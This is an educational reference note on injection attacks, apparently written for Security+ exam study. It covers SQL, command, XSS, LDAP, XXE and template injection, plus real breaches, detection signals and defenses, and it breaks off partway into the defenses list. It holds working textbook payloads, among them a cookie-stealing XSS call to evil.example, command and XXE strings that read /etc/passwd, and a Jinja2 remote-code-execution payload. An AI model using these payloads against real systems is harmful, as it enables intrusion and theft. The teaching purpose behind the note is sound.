```markdown
---
domain: "application-security"
tags: [injection, owasp, web-security, appsec, attack, input-validation]
---
# Injection Attacks

**Injection attacks** are a class of vulnerabilities in which an attacker supplies **untrusted input** that is interpreted by an application as **code, commands, or query syntax** rather than as inert data. They exploit the failure of software to maintain a strict boundary between a control plane (instructions) and a data plane (parameters), and they encompass families such as [[SQL Injection]], [[Command Injection]], [[Cross-Site Scripting]] (XSS), [[LDAP Injection]], [[XML External Entity]] (XXE), [[Server-Side Template Injection]] (SSTI), and [[NoSQL Injection]].

---

## Overview

Injection vulnerabilities are among the oldest and most damaging classes of software flaw. They appeared on the very first **OWASP Top 10** in 2003, held the #1 position from 2010 through 2017, and remain at **A03:2021 – Injection** in the current list, which now consolidates Cross-Site Scripting under the broader injection umbrella. MITRE's CWE Top 25 likewise lists **CWE-89 (SQL Injection)**, **CWE-78 (OS Command Injection)**, **CWE-79 (XSS)**, and **CWE-94 (Code Injection)** consistently in the top dozen most dangerous weaknesses.

The root cause is conceptually simple: an interpreter — a SQL engine, a shell, an HTML parser, an LDAP server, a template engine — is handed a string that mixes developer-controlled syntax with attacker-controlled values, and the interpreter has no way to tell which bytes were meant as syntax and which were meant as data. When the attacker can introduce metacharacters (`'`, `;`, `<`, `&`, `|`, `$`, `{{`), they can break out of the intended data context and inject new instructions. The interpreter then dutifully executes them with the privileges of the calling application.

The real-world impact has been enormous. The 2008 **Heartland Payment Systems** breach (≈134 million card records) began with SQL injection. The **Sony Pictures / LulzSec** dump of 2011, the **Yahoo! Voices** leak of 450,000 plaintext passwords in 2012, the **TalkTalk** breach affecting 157,000 customers in 2015 (costing ≈£77M), the 2017 **Equifax** breach via an Apache Struts OGNL template injection (**CVE-2017-5638**, 147 million records), and the 2021 **Log4Shell** crisis (**CVE-2021-44228**, a JNDI/LDAP lookup injection in Log4j) all trace directly to injection-class flaws.

Injection persists because the underlying interpreters (SQL, sh, HTML, XPath, etc.) were designed to mix code and data freely, and because string concatenation is the most natural way for developers to build queries. The fix — separating the control channel from the data channel via **parameterization**, **prepared statements**, **safe APIs**, and **contextual output encoding** — is well known but must be applied at every call site, in every language, by every developer, across decades of legacy code.

The category is intentionally broad: any time a program builds an "instruction" out of a "value," there is potential for injection. New variants emerge with each new technology stack — **GraphQL injection**, **prompt injection** against LLMs, **CRLF injection** into HTTP headers, **deserialization gadget chains** — but all share the same structural defect.

---

## How It Works

Every injection attack follows the same three-stage pattern:

1. **Untrusted input enters the application** — via HTTP parameter, header, cookie, file upload, API field, environment variable, or a database row written by another component.
2. **The application incorporates that input into a string passed to an interpreter** — a database driver, `system()`/`exec()`, a template engine, an XML/JSON parser, or a browser.
3. **The interpreter parses attacker-supplied bytes as syntax**, executing instructions the developer never intended.

---

### SQL Injection (CWE-89)

A vulnerable PHP login might build a query like:

```php
$sql = "SELECT id FROM users WHERE name='" . $_POST['user'] . "' AND pw='" . $_POST['pw'] . "'";
```

Submitting `user=admin' --` produces:

```sql
SELECT id FROM users WHERE name='admin' --' AND pw='whatever'
```

The `--` comments out the password check entirely. Attack sub-types include:

- **Union-based**: `' UNION SELECT username,password FROM users--` — appends a second result set to the response.
- **Boolean-blind**: `' AND SUBSTRING(password,1,1)='a` — infers characters one at a time from a true/false difference in the response.
- **Time-based blind**: `' AND SLEEP(5)--` (MySQL) or `'; WAITFOR DELAY '0:0:5'--` (MSSQL) — leaks data through measurable response delay.
- **Out-of-band**: Uses `xp_cmdshell`, `LOAD_FILE`, or `UTL_HTTP.REQUEST` to exfiltrate data via DNS or HTTP callbacks.

---

### OS Command Injection (CWE-78)

```python
# Vulnerable
import os
os.system("ping -c 1 " + user_supplied_host)
```

If `user_supplied_host = "8.8.8.8; cat /etc/passwd"`, both commands execute. Shell metacharacters that chain commands include:

| Metacharacter | Effect |
|---|---|
| `;` | Sequence — run second command unconditionally |
| `&&` | AND — run second only if first succeeds |
| `\|\|` | OR — run second only if first fails |
| `\|` | Pipe — feed stdout of first into second |
| `` ` `` or `$()` | Command substitution |
| `\n` | Newline — many parsers accept as command separator |

On Windows, `&`, `|`, `^`, and `%0A` play equivalent roles.

---

### Cross-Site Scripting (CWE-79)

```html
<!-- Vulnerable PHP template -->
<div>Welcome, <?= $_GET['name'] ?></div>
```

`?name=<script>fetch('//evil.example/?c='+document.cookie)</script>` executes JavaScript in the victim's browser, inside the victim's session origin. The three sub-types:

- **Reflected XSS** — payload is in the request and returned in the immediate response; requires social engineering to deliver.
- **Stored XSS** — payload is persisted in the database (comment, profile field) and served to every subsequent viewer.
- **DOM-based XSS** — a client-side script writes attacker-controlled data (`location.hash`, `document.referrer`) into the DOM without server involvement.

---

### LDAP Injection

A vulnerable authentication filter built as:

```
(&(uid=USERVAL)(pw=PWVAL))
```

becomes, with input `uid=*)(uid=*))(|(uid=*`:

```
(&(uid=*)(uid=*))(|(uid=*)(pw=...))
```

This is a tautology that authenticates any user regardless of password.

---

### XML External Entity Injection / XXE (CWE-611)

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

An XML parser with external entity processing enabled dereferences `file:///etc/passwd` and inlines the content in its output, giving the attacker arbitrary file read. Blind XXE exfiltrates via DNS or HTTP with `SYSTEM "http://attacker.example/?data=..."`.

---

### Server-Side Template Injection (SSTI)

In Jinja2 (Python), reaching RCE through the object graph:

```python
# Payload: {{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}
```

In Apache Struts 2 (**CVE-2017-5638**), an OGNL expression in the `Content-Type` header was evaluated server-side:

```
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...(@java.lang.Runtime@getRuntime().exec('id'))}
```

---

**Protocol independence** is key: injection happens at the **parser/interpreter layer**, not at a specific network port. SQLi traverses HTTP/443 to a web app that talks to MySQL on **TCP 3306**, PostgreSQL on **TCP 5432**, or MSSQL on **TCP 1433**. LDAP injection reaches LDAP on **TCP 389** (or **636** over TLS). The attacker rarely touches those backend ports directly — the vulnerable application acts as an unwitting proxy.

---

## Key Concepts

- **Interpreter/Parser Confusion** — The structural root cause of all injection: untrusted bytes are evaluated as syntax by a downstream interpreter (SQL engine, shell, HTML parser, template engine, XML processor). Every injection variant is an instance of this one pattern.
- **In-band vs. Blind vs. Out-of-band** — *In-band* returns results directly in the HTTP response. *Blind* infers data from boolean or timing side-channels when no output is reflected. *Out-of-band* exfiltrates via a completely separate channel — DNS lookups, HTTP callbacks, or SMB — detected using tools like Burp Collaborator or `interactsh`.
- **First-order vs. Second-order Injection** — *First-order* exploits the payload on the same request that delivers it. *Second-order* (stored injection) persists the malicious value in a database, log, or profile field and triggers when later application code reads and concatenates it into a new query — often written and read by completely different code paths.
- **Parameterization / Prepared Statements** — The canonical primary defense. The query template and parameter values travel to the interpreter on **separate channels**, so user data is always treated as a literal value and can never become syntax. Implemented as `pstmt.setString(1, x)` in JDBC, `%s` placeholders in `psycopg2`, `$1`/`$2` in libpq, and `PDO::bindParam` in PHP.
- **Contextual Output Encoding** — For XSS, the same value must be encoded differently depending on its placement: HTML body (`&lt;`), HTML attribute (`&#x22;`), JavaScript string (`\u003c`), URL (`%3C`), or CSS (`\003c`). Using one encoding context in another breaks security. Libraries like **OWASP Java Encoder** and **DOMPurify** handle this correctly.
- **Allowlist vs. Denylist Input Validation** — Allowlists (accept only characters matching a known-good pattern) are the durable approach. Denylists (block known-bad strings) are bypassable through encoding tricks: `%27` for `'`, `&#x27;`, double-URL-encoding, Unicode normalization, comment insertion (`UN/**/ION`), or case variation.
- **Least Privilege at the Interpreter** — Even a fully successful injection is contained if the database account only has `SELECT` on its own schema, `xp_cmdshell` is disabled, and the web server runs as an unprivileged user. Defense in depth at the interpreter layer bounds the blast radius of every injection flaw.

---

## Exam Relevance

**SY0-701 domain mappings:**
- **Domain 2.3** — Attack types: explicitly lists SQL injection, XML injection, LDAP injection, and command injection.
- **Domain 2.4** — Application attacks: includes XSS, injection, and buffer overflows.
- **Domain 3.2** — Secure baselines and hardening: ties to safe coding practices.
- **Domain 4.3** — Vulnerability management: SAST/DAST scanning and remediation.

**Common question patterns and how to read them:**

| Scenario clue | Likely answer |
|---|---|
| URL parameter contains `'` or `--`, application returns DB error | SQL Injection |
| User clicks a malicious link; their browser executes something | Reflected XSS |
| Every visitor to a forum page has their cookie stolen | Stored XSS |
| Application feeds user-supplied filename to a shell | Command Injection |
| Best mitigation for SQLi | Parameterized queries / prepared statements |
| Best mitigation for XSS | Output encoding + Content Security Policy |

**Gotchas that appear as distractors:**

- **Stored procedures are NOT automatically safe.** If the stored proc builds a query string with `EXEC` or string concatenation internally, it is just as vulnerable as inline SQL. The safe version uses `sp_executesql` with typed parameters.
- **WAFs are compensating controls, not primary mitigations.** The correct primary answer is parameterization or encoding; WAF is the defense-in-depth layer.
- **Input validation ≠ the right answer for SQLi.** Parameterized queries are the correct answer. Input validation is a supporting control.
- **XSS ≠ CSRF.** XSS executes arbitrary script in the victim's browser. CSRF tricks the victim's browser into making a specific authenticated request. They are separate attack types with different mitigations.
- **Path traversal vs. command injection** — traversal *reads* files by escaping the allowed directory; command injection *executes arbitrary OS commands*.

---

## Security Implications

Injection flaws routinely produce **complete confidentiality and integrity loss** for the affected data store and frequently escalate to **remote code execution (RCE)** on the underlying host. Notable CVEs and incidents:

- **CVE-2017-5638** — Apache Struts 2 OGNL injection. An attacker-controlled `Content-Type` header containing an OGNL expression triggered arbitrary Java code execution. Exploited in the **Equifax** breach (2017): 147 million U.S. consumer records; settlement exceeding $700M.
- **CVE-2021-44228 "Log4Shell"** — Log4j 2.x JNDI/LDAP injection. Any string logged by Log4j that contained `${jndi:ldap://attacker/x}` caused the JVM to fetch and execute a remote Java class. CVSS 10.0; affected virtually every Java application that logged user input; exploited within hours of disclosure.
- **CVE-2014-6271 "Shellshock"** — Bash function definition syntax in environment variables was executed as commands, turning every CGI-using web server into an unauthenticated RCE target. Exploited against DHCP clients, mail filters, and CGI scripts globally.
- **CVE-2019-19781** — Citrix ADC/Gateway path traversal combined with template injection; exploited en masse against enterprises and government agencies within days of disclosure.
- **Heartland Payment Systems (2008)** — SQL injection against a public web form pivoted to the payment-processing network; ≈134 million card numbers stolen.
- **TalkTalk (2015)** — SQL injection via a legacy web portal; 157,000 customer records exfiltrated; ICO fine of £400K; total cost ≈£77M.

**Detection signals:**

| Layer | What to look for |
|---|---|
| WAF logs | ModSecurity CRS rules 942xxx (SQLi), 941xxx (XSS), 932xxx (command injection) |
| DB audit logs | Unusual `UNION`, `INFORMATION_SCHEMA`, `SLEEP`, `xp_cmdshell` calls |
| App/error logs | Unhandled parser exceptions, syntax error messages |
| Network/IDS | Suricata/Snort ET Injection ruleset (`et/emerging-sql.rules`) |
| EDR/SIEM | Web server spawning unexpected child processes: `w3wp.exe → cmd.exe`, `httpd → /bin/sh` |
| RASP | Runtime hooks inside the interpreter flagging tainted input reaching a sink |

---

## Defensive Measures

1. **Use parameterized queries everywhere.** Prepared statements (`PreparedStatement` + `setString